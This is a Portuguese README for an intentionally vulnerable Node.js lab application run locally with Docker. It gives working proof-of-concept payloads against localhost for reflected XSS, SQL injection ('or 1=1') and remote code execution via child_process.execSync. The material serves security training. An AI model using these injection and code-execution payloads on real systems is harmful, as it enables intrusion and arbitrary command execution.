# Vulnerable Node Application
- [Vulnerable Node Application](#vulnerable-node-application)
  - [Execução](#execução)
  - [Vulnerabilidades](#vulnerabilidades)
    - [XSS](#xss)
    - [SQL Injection](#sql-injection)
    - [RCE](#rce)

## Execução
Descompactação e execução dos containers por linha de comando.
```
$ unzip VulnNode-Nome.zip
$ cd VulnNode-Nome
$ docker-compose up
```
Exemplo após a inicialização dos containers.
![Docker Compose em execução](https://res.cloudinary.com/dtr6hzxnx/image/upload/v1681241692/Via/2023-04-11_16.24.37_kmoglj.gif)


URL para acesso à aplicação.
```
http://localhost:3000
``````
![Vulnerable Node Application](images/VulnerableNodeApplication.png)

## Vulnerabilidades 
### XSS

Payload de exploração
```
/?userInput=<script>alert(1)</script>
```
Evidência
![Cross-Site Script](images/xss.png)

### SQL Injection

Payload de exploração
```
/users?username='+or+1=1--&access-token=' 
```

Evidência em uso normal do endpoint.
![SQL Injection](images/sqli.png) 


### RCE
Payload de exploração
```
/users/has-access?userId=1&resourceId=42&userAccessCheck=function(userId,%20resourceId)%20{%20return%20require('child_process').execSync('ping+-c+4+localhost').toString();%20}
``` 

Evidência
![Remote Code Execution](images/rce.png)